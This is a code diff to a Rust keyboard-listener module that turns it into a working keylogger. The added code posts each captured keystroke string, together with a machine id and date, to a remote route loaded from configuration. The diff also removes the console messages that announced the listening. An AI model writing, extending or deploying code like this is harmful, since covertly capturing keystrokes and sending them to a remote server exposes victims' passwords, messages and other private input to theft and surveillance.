@@ -3,10 +3,14 @@ use device_query::Keycode;
 pub use device_query::device_events::KeyboardCallback;
 use device_query::{DeviceState, keymap};
 use device_query::CallbackGuard;
+use reqwest::blocking::Client;
+use reqwest::blocking::Response;
+use crate::sys::load_route;
+use crate::sys::get_id;
+use crate::sys::get_date;
 
 
 pub fn cat(){
-    println!("listening to keyboard !");
     let device_state = DeviceState::new();
     let _device_state = listen(device_state);
 
@@ -17,8 +21,9 @@ pub fn cat(){
 }
 
 fn listen(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
+
     device_state.on_key_up(|keys| {
-        println!("inside device state");
+
         let mut cache: String = String::new();
         let chars = keycode_to_string(*keys).chars();
         for c in chars{
@@ -29,10 +34,23 @@ fn listen(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
     )
 }
 
-fn send(chars: String){
+fn send(chars: String) -> Result<Response, reqwest::Error> {
     println!("send function test");
 
-    println!("{}", chars);
+    let route = load_route();
+    let id = get_id();
+    let date = get_date();
+    let req = format!("{}/?id={}&date={}&text={}",
+                      route,
+                      id,
+                      date,
+                      chars);
+    println!("{}", req);
+    let client = Client::new();
+    let r = client.post(req).build();
+    let r = client.execute(r.unwrap()).unwrap();
+    Ok(r)
+    
 }
 
 fn keycode_to_string(keys: Keycode) -> &'static str{
